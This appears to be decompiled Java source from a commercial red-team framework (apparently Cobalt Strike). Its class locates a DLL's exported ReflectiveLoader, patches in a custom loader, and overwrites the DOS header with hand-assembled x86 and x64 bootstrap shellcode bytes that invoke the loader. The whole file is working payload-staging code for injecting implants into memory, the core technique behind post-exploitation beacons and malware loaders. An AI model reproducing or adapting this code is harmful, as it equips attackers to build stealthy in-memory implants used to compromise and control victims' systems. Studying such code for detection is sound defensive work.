package common;

import java.util.Iterator;
import java.util.List;
import pe.PEParser;

public class ReflectiveDLL {
   public static final int EXIT_FUNK_PROCESS = 1453503984;
   public static final int EXIT_FUNK_THREAD = 170532320;

   public static void setReflectiveLoader(PEParser var0, byte[] var1, byte[] var2, ReflectiveLoaderInfo var3) {
      String var4 = "setReflectiveLoader";
      String var5 = "Function Offset: " + var3.offset + " Real Offset: " + var3.realOffset + " Loader Length: " + var2.length + " Reserved Space: " + var3.length + " Total Space: " + var3.totalLength;
      DevLog.log(DevLog.STORY.CS0541, ReflectiveDLL.class, var4, var5);
      System.arraycopy(var2, 0, var1, var3.offset, var2.length);
   }

   public static int findReflectiveLoader(PEParser var0) {
      List var1 = var0.getExportedFunctions();
      Iterator var2 = var1.iterator();

      String var3;
      do {
         if (!var2.hasNext()) {
            return -1;
         }

         var3 = (String)var2.next();
      } while(var3.indexOf("ReflectiveLoader") < 0);

      return var0.getFunctionOffset(var3);
   }

   public static int findReflectiveLoader(byte[] var0) {
      try {
         return findReflectiveLoader(PEParser.load(var0));
      } catch (Exception var2) {
         MudgeSanity.logException("Could not find Reflective Loader", var2, false);
         return -1;
      }
   }

   public static ReflectiveLoaderInfo getReflectiveLoaderInfo(PEParser var0, byte[] var1) {
      String var2 = "getReflectiveLoaderInfo";
      ReflectiveLoaderInfo var3 = new ReflectiveLoaderInfo();
      var3.offset = findReflectiveLoader(var0);
      if (var3.offset < 1) {
         throw new IllegalStateException("Reflective Loader Offset was not found.");
      } else {
         byte[] var4 = new byte[]{-52, -112, -112, -112, -112, -112, -112, -112};
         var3.realOffset = CommonUtils.indexOf(var1, var4, var3.offset, var3.offset + 64);
         String var5 = "Reflective Loader Space Offset: " + var3.offset + " Real Offset: " + var3.realOffset;
         DevLog.log(DevLog.STORY.CS0541, ReflectiveDLL.class, var2, var5);
         if (var3.realOffset > 0) {
            var3.length = findReflectiveLoaderLength(var1, var3.realOffset);
         } else {
            var3.realOffset = var3.offset;
            var3.length = findReflectiveLoaderLength(var1, var3.realOffset);
         }

         var3.totalLength = var3.length + (var3.realOffset - var3.offset);
         var5 = "Adjusted Reflective Loader Space Offset: " + var3.offset + " Real Offset: " + var3.realOffset + " Length: " + var3.length + " Total Length: " + var3.totalLength;
         DevLog.log(DevLog.STORY.CS0541, ReflectiveDLL.class, var2, var5);
         if (var3.length <= 0) {
            CommonUtils.print_error("Reflective Loader Space length is zero. Something is wrong!");
         }

         return var3;
      }
   }

   public static int findReflectiveLoaderLength(byte[] var0, int var1) {
      String var2 = "findReflectiveLoaderLength";
      String var3 = "Finding Reflective Loader Length at Offset: " + var1;
      DevLog.log(DevLog.STORY.CS0541, ReflectiveDLL.class, var2, var3);
      if (var0 == null) {
         throw new NullPointerException("Reflective loader info error. Data is null.");
      } else if (var0.length < var1 + 1) {
         throw new IllegalArgumentException("Reflective loader offset (" + var1 + ") is beyond data length(" + var0.length + ").");
      } else {
         int var4;
         for(var4 = 0; var1 + var4 < var0.length; ++var4) {
            if ((var0[var1 + var4] & 255) != 204 && (var0[var1 + var4] & 255) != 144) {
               var3 = "Found Reflective Loader Length: " + var4;
               DevLog.log(DevLog.STORY.CS0541, ReflectiveDLL.class, var2, var3);
               return var4;
            }
         }

         CommonUtils.print_error("Something went wrong. End of reflective loader space was not found.");
         return var4;
      }
   }

   public static boolean is64(byte[] var0) {
      try {
         PEParser var1 = PEParser.load(var0);
         return var1.is64();
      } catch (Exception var2) {
         MudgeSanity.logException("Could not find parse PE header in binary blob", var2, false);
         return false;
      }
   }

   public static byte[] patchDOSHeader(byte[] var0) {
      return patchDOSHeader(var0, 1453503984);
   }

   public static byte[] patchDOSHeader(byte[] var0, int var1) {
      int var2 = findReflectiveLoader(var0);
      if (is64(var0)) {
         throw new RuntimeException("x64 DLL passed to x86 patch function");
      } else if (var2 < 0) {
         return new byte[0];
      } else {
         Packer var3 = new Packer();
         var3.little();
         var3.addByte(77);
         var3.addByte(90);
         var3.addByte(232);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(91);
         var3.addByte(82);
         var3.addByte(69);
         var3.addByte(85);
         var3.addByte(137);
         var3.addByte(229);
         var3.addByte(129);
         var3.addByte(195);
         var3.addInt(var2 - 7);
         var3.addByte(255);
         var3.addByte(211);
         var3.addByte(137);
         var3.addByte(195);
         var3.addByte(87);
         var3.addByte(104);
         var3.addByte(4);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(80);
         var3.addByte(255);
         var3.addByte(208);
         var3.addByte(104);
         var3.addInt(var1);
         var3.addByte(104);
         var3.addByte(5);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(80);
         var3.addByte(255);
         var3.addByte(211);
         byte[] var4 = var3.getBytes();
         if (var4.length > 60) {
            CommonUtils.print_error("bootstrap length is: " + var4.length + " (it's too big!)");
            return new byte[0];
         } else {
            for(int var5 = 0; var5 < var4.length; ++var5) {
               var0[var5] = var4[var5];
            }

            return var0;
         }
      }
   }

   public static byte[] patchDOSHeaderX64(byte[] var0) {
      return patchDOSHeaderX64(var0, 1453503984);
   }

   public static byte[] patchDOSHeaderX64(byte[] var0, int var1) {
      int var2 = findReflectiveLoader(var0);
      if (!is64(var0)) {
         throw new RuntimeException("x86 DLL passed to x64 patch function");
      } else if (var2 < 0) {
         return new byte[0];
      } else {
         Packer var3 = new Packer();
         var3.little();
         var3.addByte(77);
         var3.addByte(90);
         var3.addByte(65);
         var3.addByte(82);
         var3.addByte(85);
         var3.addByte(72);
         var3.addByte(137);
         var3.addByte(229);
         var3.addByte(72);
         var3.addByte(129);
         var3.addByte(236);
         var3.addByte(32);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(72);
         var3.addByte(141);
         var3.addByte(29);
         var3.addByte(234);
         var3.addByte(255);
         var3.addByte(255);
         var3.addByte(255);
         var3.addByte(72);
         var3.addByte(129);
         var3.addByte(195);
         var3.addInt(var2);
         var3.addByte(255);
         var3.addByte(211);
         var3.addByte(72);
         var3.addByte(137);
         var3.addByte(195);
         var3.addByte(73);
         var3.addByte(137);
         var3.addByte(248);
         var3.addByte(104);
         var3.addByte(4);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(90);
         var3.addByte(255);
         var3.addByte(208);
         var3.addByte(65);
         var3.addByte(184);
         var3.addInt(var1);
         var3.addByte(104);
         var3.addByte(5);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(0);
         var3.addByte(90);
         var3.addByte(255);
         var3.addByte(211);
         byte[] var4 = var3.getBytes();
         if (var4.length > 60) {
            CommonUtils.print_error("bootstrap length is: " + var4.length + " (it's too big!)");
            return new byte[0];
         } else {
            for(int var5 = 0; var5 < var4.length; ++var5) {
               var0[var5] = var4[var5];
            }

            return var0;
         }
      }
   }
}
